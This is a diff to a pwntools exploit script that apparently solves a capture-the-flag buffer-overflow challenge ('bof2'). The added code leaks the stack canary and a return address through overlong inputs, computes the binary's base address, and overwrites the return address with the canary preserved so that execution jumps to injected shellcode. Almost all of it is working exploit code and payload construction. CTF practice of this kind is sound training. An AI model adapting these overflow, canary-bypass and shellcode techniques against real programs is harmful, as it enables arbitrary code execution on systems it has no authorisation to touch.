@@ -8,15 +8,16 @@ import re
 context.arch = 'amd64'
 context.os = 'linux'
 
-FLAG_PATTERN = r"FLAG\{.*?\}"
+exe = './bof2'
+port = 12343
 
-exe = './bof1'
-port = 12342
+FLAG_PATTERN = r"FLAG\{.*?\}"
 
 elf = ELF(exe)
 off_main = elf.symbols.get(b'main', 0)
 base = 0
 qemu_base = 0
+
 
 r = None
 if 'local' in sys.argv[1:]:
@@ -57,20 +58,29 @@ shellcode = asm("""
     syscall
 """)
 
-# buf1:     0x7fffffffe2f0 # Leak Addr
-# buf2:     0x7fffffffe2c0 # Write msg
-# buf3:     0x7fffffffe290
+# buf1:     0x7fffffffe290 # Canary
+# buf2:     0x7fffffffe2c0 # Leak Addr
+# buf3:     0x7fffffffe2f0 # Write msg
 # ret_addr: 0x7fffffffe328
 
+
 r.recvuntil(b"What's your name? ")
-payloads = b'A'*56
+payloads = b'A'*137
+r.send(payloads)
+
+res = r.recvline()
+canary = u64(res.split(b'A'*136)[1][1:8].rjust(8, b'\x00'))
+
+r.recvuntil(b"What's the room number? ")
+payloads = b'A'*104
 r.send(payloads)
 
 res = r.recvline()
 
-ret_addr = u64(res.split(b'A'*56)[1][:-1].ljust(8, b'\x00'))
+ret_addr = u64(res.split(b'A'*104)[1][:-1].ljust(8, b'\x00'))
 
 main_offset = elf.symbols['main']
+task_offset = elf.symbols['task']
 msg_offset = elf.symbols['msg']
 
 base_addr = ret_addr - 0xC6 - main_offset
@@ -78,13 +88,10 @@ msg_addr = base_addr + msg_offset
 
 new_ret_addr = p64(msg_addr, endian='little')
 
-payloads = b'A'*104 + new_ret_addr
-
-r.recvuntil(b"What's the room number? ")
-r.send(payloads)
+payloads = b'A'*40 + p64(canary, endian='little') + b'B' * 8 + new_ret_addr
 
 r.recvuntil(b"What's the customer's name? ")
-r.send(b'Chloe')
+r.send(payloads)
 
 r.recvuntil(b"Leave your message: ")
 r.send(shellcode)
